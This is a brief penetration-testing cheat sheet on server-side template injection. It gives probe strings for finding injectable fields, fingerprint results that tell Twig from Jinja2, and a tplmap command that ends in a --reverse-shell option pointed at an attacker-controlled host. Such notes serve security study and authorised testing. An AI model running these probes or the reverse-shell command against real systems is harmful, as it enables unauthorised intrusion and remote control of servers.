# Server Side Template Injection

Inject strings that get interpreted as part of the template language a website is using.

## Manual

A First step is to look for vulnerable fields with some standard strings, to evaluate weather the target replaces them with the expected result:
* `${7*7}`
* `${{7*7}}`
If an injection point is found, the type of the template system has to be found. Depending on the type answers to default strings vary and different strings have to be used to exploit them.

## Fingerprints

Teststring: `{{7*'7'}}`
Result:
* Twig: `49`
* Jinja2: `7777777`
* None:  `{{7*'7'}}`


## Tplmap

Basically like sqlmap for sql injections or commix for command injections.

```cheat tplmap example command
python tplmap.py -u 'http://<rhost>:<rport>' -X POST -d '<post data>, mark injection point with *' -c '<cookies>' --reverse-shell <lhost> <lport>
```

## Links

* https://portswigger.net/blog/server-side-template-injection

tags: ssti tplmap jinja2 twig